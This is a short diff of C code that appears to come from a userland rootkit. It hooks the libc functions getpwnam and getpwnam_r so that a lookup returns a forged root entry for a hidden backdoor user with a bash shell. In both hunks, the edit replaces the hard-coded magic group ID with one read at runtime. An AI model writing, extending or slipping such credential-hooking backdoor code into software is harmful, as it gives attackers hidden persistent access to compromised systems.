@@ -5,8 +5,9 @@ struct passwd *getpwnam(const char *name){
         struct passwd *bpw = call(CGETPWNAM, "root");
 
         bpw->pw_name = BD_UNAME;
-        bpw->pw_uid = MAGIC_GID;
-        bpw->pw_gid = MAGIC_GID;
+        gid_t magicgid = readgid();
+        bpw->pw_uid = magicgid;
+        bpw->pw_gid = magicgid;
         bpw->pw_dir = INSTALL_DIR;
         bpw->pw_shell = "/bin/bash";
 
@@ -23,8 +24,9 @@ int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, s
         call(CGETPWNAM_R, "root", pwd, buf, buflen, result);
 
         pwd->pw_name = BD_UNAME;
-        pwd->pw_uid = MAGIC_GID;
-        pwd->pw_gid = MAGIC_GID;
+        gid_t magicgid = readgid();
+        pwd->pw_uid = magicgid;
+        pwd->pw_gid = magicgid;
         pwd->pw_dir = INSTALL_DIR;
         pwd->pw_shell = "/bin/bash";
 
